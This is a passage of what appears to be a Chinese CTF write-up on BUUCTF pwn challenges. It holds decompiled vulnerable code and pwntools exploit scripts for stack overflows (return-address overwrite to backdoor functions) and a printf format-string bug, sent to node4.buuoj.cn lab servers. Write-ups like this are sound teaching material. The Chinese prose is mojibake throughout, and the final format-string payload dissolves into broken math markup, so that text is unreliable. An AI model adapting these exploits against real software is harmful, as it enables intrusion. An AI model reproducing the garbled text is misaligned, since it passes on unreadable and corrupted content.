ˆæº¢å‡ºï¼Œå¯ä»¥è¦†ç›–è¿”å›åœ°å€ï¼Œä»è€ŒåŠ«æŒç¨‹åºæµã€‚<br>ä½¿ç”¨pwndbgåˆ†æï¼Œå¯ä»¥å¾—åˆ°sçš„èµ·å§‹åœ°å€ä¸æ ˆåº•(rbp)çš„è·ç¦»ä¸º15ä¸ªå­—èŠ‚ï¼ˆå½“æ—¶ä¸€ç›´ä»¥ä¸ºä¼šæ˜¯8çš„æ•´æ•°å€ï¼Œå¡äº†å¥½ä¹…ï¼‰<br>è€Œrbpè·ç¦»å‡½æ•°çš„è¿”å›åœ°å€é—´æœ‰8å­—èŠ‚ï¼Œç”¨äºå­˜æ”¾çˆ¶å‡½æ•°rbpçš„åœ°å€ã€‚<br>åªéœ€è¦å¡«å……15 + 8å­—èŠ‚çš„åƒåœ¾æ•°æ®ï¼Œå†å¡«ä¸Šfunå‡½æ•°çš„åœ°å€å³å¯ã€‚<br>å‘é€å³å¯æ‹¿shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">a = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29236</span>)</span><br><span class="line"><span class="comment"># a = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xF</span>+<span class="number">0x8</span>) + p64(<span class="number">0x401186</span>+<span class="number">1</span>)</span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure><p>flagä¸º<code>flag&#123;e9332920-7605-4cbc-a337-3d75d42eb052&#125;</code><br>expä¸­åé¢å‡½æ•°åœ°å€åŠ 1çš„åŸå› æ˜¯ä¸ºäº†ä¿æŒ16å­—èŠ‚å¯¹é½ï¼Œåœ¨64ä½æŒ‡ä»¤ä¸­å­˜åœ¨movapsæŒ‡ä»¤ï¼Œéœ€è¦ä¼ å…¥çš„å‚æ•°16å­—èŠ‚å¯¹é½ï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒå‘çš„åœ°æ–¹ã€‚<br><a href="https://iamvegetable2.github.io/2022/07/27/some-problems-about-movaps/">è¯¦ç»†åŸå› è¯·è§</a></p><h2 id="warmup-csaw-2016">warmup_csaw_2016</h2><p>å¾ˆç®€å•çš„æ ˆæº¢å‡ºã€‚<br>checksecä¸€ä¸‹ï¼Œå†ä½¿ç”¨IDAåˆ†æ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">9uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_40060D</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_40060Dä¸ºåé—¨å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥æ‹¿åˆ°flagã€‚<br>mainå‡½æ•°ä¸­gets(v5)è¯­å¥å­˜åœ¨æ ˆæº¢å‡ºï¼Œé€šè¿‡åŠ¨æ€è°ƒè¯•ï¼Œæˆ‘ä»¬å¯ä»¥è®¡ç®—å¾—è¾“å…¥æ•°æ®çš„åœ°å€ä¸rbpçš„å·®å€¼ä¸º0x40å­—èŠ‚ï¼Œæ•…éœ€è¦0x48å­—èŠ‚çš„å¡«å……æ•°æ®ï¼Œå†å¡«å……ä¸Šæˆ‘ä»¬sub_40060Dçš„åœ°å€å³å¯ã€‚<br>è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27568</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./warmup_csaw_2016&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">0x8</span>)  + p64(<span class="number">0x40060D</span>) </span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27;*(0x40+0x8) + p64(0x4006a4) + p64(0x40060D) </span></span><br><span class="line"><span class="comment"># çœ‹æœ‰ä¸€äº›wpè¿™æ ·å†™ï¼Œè¿™ä¸ªä¸­é—´å¡«å……çš„æ•°æ®ä¸ºret gadgetï¼Œä¸»è¦ä½œç”¨å¯èƒ½æ˜¯ç»´æŠ¤å †æ ˆå¹³è¡¡ï¼Ÿä½†äº‹å®ä¸Šä¸Šé¢çš„payloadå°±å¯ä»¥æ‹¿åˆ°flagäº†</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥å¾—åˆ°flag<code>flag&#123;722bdaf7-e159-44da-a466-dc4121ed6adc&#125;</code></p><h2 id="ciscn-2019-n-1">ciscn_2019_n_1</h2><p>checksecï¼Œ64ä½ï¼Œä»…å¼€å¯PIEã€‚<br>mainå‡½æ•°ä½œç”¨ä»…ä»…æ˜¯è®¾ç½®ç¼“å†²åŒºå’Œè°ƒç”¨funcå‡½æ•°ï¼Œç›´æ¥çœ‹funcå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    result = system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“v2ä¸º11.28125æ—¶ï¼Œè°ƒç”¨systemè¯»å–flagï¼Œæˆ‘ä»¬åªéœ€è¦è®©v2çš„å€¼ä¸º11.28125å³å¯ã€‚<br>ä¸è¿‡å‡½æ•°ä¸­å¹¶æ²¡æœ‰è®¾ç½®v2å€¼çš„ä½ç½®ã€‚getså‡½æ•°è¯»å…¥çš„è¾“å…¥å­˜å…¥v1ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿v1æº¢å‡ºï¼Œè¦†ç›–v2çš„ä½ç½®ï¼Œä»è€Œä¿®æ”¹v2çš„å€¼ã€‚<br>æ ¹æ®åŠ¨æ€è°ƒè¯•ï¼Œv1çš„èµ·å§‹åœ°å€ä¸rbpçš„å·®å€¼ä¸º0x30å­—èŠ‚ï¼Œv2ä¸º0x4å­—èŠ‚ï¼Œåˆ™v1ä¸v2ä¸­é—´çš„å·®å€¼ä¸º(0x30-0x4)å­—èŠ‚ï¼Œv2å¤„çš„å€¼å¡«å……ä¸º11.28125çš„æœºå™¨ç å³å¯ã€‚<br>è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27229</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./ciscn_2019_n_1&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x4</span>) + p64(<span class="number">0x41348000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flagä¸º<code>flag&#123;eabfcf4c-f318-4354-ba3e-57202826b8ee&#125;</code></p><h2 id="pwn1-sctf-2016">pwn1_sctf_2016</h2><p>checksecï¼Œ32ä½ï¼Œä»…å¼€å¯NXã€‚<br>æ˜¯C++å†™æˆçš„ç¨‹åºï¼Œmainå‡½æ•°æ²¡ä»€ä¹ˆä½œç”¨ï¼Œç›´æ¥çœ‹vulnå‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">32</span>, edata);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, s);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">replace</span>((std::string *)v3);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, v3, v6, v4);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v3);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v4);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€»è¾‘æ˜¯å°†è¾“å…¥å­—ç¬¦ä¸²ä¸­â€™Iâ€™æ›¿æ¢ä½â€™youâ€™ï¼Œè¾“å…¥é™å®šä¸º32å­—èŠ‚ï¼Œæ ¹æ®åŠ¨æ€åˆ†æéœ€è¦60å­—èŠ‚æ‰èƒ½æº¢å‡ºã€‚<br>æ‰€ä»¥æˆ‘ä»¬è¾“å…¥21ä¸ªâ€™Iâ€™ï¼Œå†æ·»åŠ 1ä¸ªâ€™aâ€™ï¼Œä»è€Œä½¿å¾—æ›¿æ¢åå­—ç¬¦ä¸²åƒåœ¾æ•°æ®ä¸º64å­—èŠ‚ï¼Œå†å¡«å…¥get_flagå‡½æ•°åœ°å€å³å¯ã€‚ï¼ˆè¿™é“é¢˜å‡ºçš„æ¯”è¾ƒå·§å¦™ï¼Œå¦‚æœåœ°å€ä¸­æœ‰å€¼è¢«è§£ç ä¸ºIå¯èƒ½ä¼šè¢«ç ´åã€‚ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29154</span>)</span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">21</span> + <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0x8048f0d</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>å¾—flag<code>flag&#123;62b7c079-6ced-4a49-a877-d3bb54a3409e&#125;</code></p><h2 id="jarvisoj-level0">jarvisoj_level0</h2><p>checksecï¼Œ64ä½ï¼Œä»…å¼€å¯NXã€‚<br>mainå‡½æ•°è°ƒç”¨vulnerable_functionå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>readå‡½æ•°å¯ä»¥è¯»å–0x200å­—èŠ‚ï¼Œè€Œbufä»…èƒ½å­˜å‚¨128å­—èŠ‚ï¼Œä¼šé€ æˆæ ˆæº¢å‡ºï¼ŒåŒæ—¶å­˜åœ¨callsystemå‡½æ•°ï¼Œå¯ä»¥ç›´æ¥æ‹¿shellã€‚<br>åŠ¨æ€è°ƒè¯•å¾—éœ€è¦0x88çš„åƒåœ¾æ•°æ®ï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28453</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flagä¸º<code>flag&#123;66fab62a-9200-43e6-93d9-d74b41b3fe47&#125;</code></p><h2 id="ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-1">[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 1</h2><p>checksecï¼Œ32ä½ï¼Œå¼€å¯NXï¼ŒCanaryã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u); <span class="comment">// å¼€å¯Canary</span></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ˆæº¢å‡ºå¯èƒ½æ²¡æœ‰ä»€ä¹ˆå¤ªå¥½çš„æ–¹æ³•ï¼Œæ¯•ç«Ÿæœ‰Canaryï¼Œä¸”é™æ€åˆ†ææ—¶ç²—ç•¥ä¼°è®¡ï¼Œreadå‡½æ•°çš„é™å®šæ¡ä»¶å¯èƒ½ä¸è¶³ä»¥ä½¿æˆ‘ä»¬çš„å­—ç¬¦ä¸²è¾¾åˆ°æº¢å‡ºçš„æ•ˆæœã€‚çœ‹åˆ°<code>printf(buf)</code>å¯ä»¥è€ƒè™‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç›´æ¥è¯»å–0x804C044å¤„å­—ç¬¦ä¸²ï¼Œä»è€Œè·å–éšæœºç”Ÿæˆçš„å¯†ç ã€‚<br>è¿™æ ·æˆ‘ä»¬å¯ä»¥è¾“å…¥0x804C044çš„åœ°å€ï¼Œå†é€šè¿‡<code>%n$s</code>è¯»å–å…¶ä¸­çš„å†…å®¹ã€‚å…¶ä¸­å½“æˆ‘ä»¬è°ƒç”¨<code>printf(buf)</code>æ—¶ï¼Œæˆ‘ä»¬è¾“å…¥çš„bufå­—ç¬¦ä¸²çš„åœ°å€ä¸espçš„å·®å€¼ä¸º0x28ï¼Œå¯ä»¥è¢«æ˜¯ä¸ºprintf()çš„ç¬¬11ä¸ªå‚æ•°ï¼ˆå› ä¸ºæ ¼å¼åŒ–å‚æ•°é‡Œé¢çš„næŒ‡çš„æ˜¯è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²å¯¹åº”çš„ç¬¬nä¸ªè¾“å‡ºå‚æ•°ï¼Œå†åŠ ä¸Šç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œåˆ™ä¸ºprintfå‡½æ•°çš„ç¬¬(n + 1)ä¸ªå‚æ•°ï¼‰ã€‚<code>%s</code>å¯ä»¥è§£æåœ°å€ï¼Œå¹¶å°†åœ°å€å€¼å¤„å­˜å‚¨çš„æ•°æ®ä½œä¸ºå­—ç¬¦ä¸²æ¥è¿›è¡Œè§£æå¤„ç†ï¼Œè¿™æ˜¯æˆ‘æœ€åˆçš„æ€è·¯ã€‚æœ€ç»ˆåªéœ€è¦è®©æˆ‘ä»¬è¾“å…¥çš„å¯†ç ä¸éšæœºç”Ÿæˆçš„å¯†ç ç›¸åŒå³å¯æ‹¿åˆ°shellï¼Œè¿™é‡Œå› ä¸ºæœ‰atoiå‡½æ•°ï¼Œéœ€è¦è¾“å…¥çš„æ˜¯æ•°å­—ã€‚</p><p><a href="https://iamvegetable2.github.io/2022/07/27/Format-String/">æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›¸å…³è§</a></p><p>ç¬¬ä¸€ç§æ–¹å¼å°±æ˜¯ä¸Šé¢çš„æ€è·¯ï¼Œæ³„éœ²0x804C044å¤„å­—ç¬¦ä¸²ï¼Œæ¥æ”¶æ³„éœ²çš„å­—ç¬¦ä¸²åå†å°†å…¶å‘é€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25897</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">payload = p32(<span class="number">0x804C044</span>) + <span class="string">b&#x27;%10$s&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Hello,&#x27;</span>)</span><br><span class="line">passwd =  r.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">passwd = passwd[<span class="number">4</span>:]</span><br><span class="line">passwd = u32(passwd)</span><br><span class="line">passwd = <span class="built_in">str</span>(passwd)</span><br><span class="line"><span class="built_in">print</span>(passwd)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;passwd:&#x27;</span>)</span><br><span class="line">payload2 = flat([passwd])</span><br><span class="line"><span class="built_in">print</span>(payload2)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰å¦ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å†™å…¥0x804C044ï¼Œä»è€Œä½¿å¾—å®ƒçš„å€¼ä¸ºæˆ‘ä»¬è®¾å®šå¥½çš„å€¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%nè¡¨ç¤ºä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å¯æ‰“å°å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡</span><br><span class="line">%k$nè¡¨ç¤ºå†™å…¥è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²å¯¹åº”çš„ç¬¬nä¸ªå‚æ•°ï¼Œå³printfå‡½æ•°çš„ç¬¬(n + 1)ä¸ªå‚æ•°</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å¡«å……ä¸€æ®µåƒåœ¾æ•°æ®ï¼Œè¿™é‡Œæˆ‘ä»¬è®¾å®šåƒåœ¾æ•°æ®é•¿åº¦ä¸º4å­—èŠ‚ï¼Œespä¸æˆ‘ä»¬å­—ç¬¦ä¸²çš„åœ°å€å·®è·ä¸æˆ‘ä»¬ä¸Šé¢è®¡ç®—çš„ç›¸åŒï¼Œç”±äºæˆ‘ä»¬æ‰€è¦å¡«å……çš„åœ°å€å€¼æ”¾åœ¨æ›´ä½åœ°å€å¤„ï¼Œè·ç¦»espè·ç¦»æ›´è¿œï¼Œæ‰€ä»¥kçš„å€¼ä¸º2ä½åè¿›åˆ¶æ•°ã€‚æ‰€ä»¥è®¡ç®—å¯å¾—æˆ‘ä»¬æ„é€ payloadä¸ºAAAA + %16<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n%17</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>n%18<span class="katex"><span 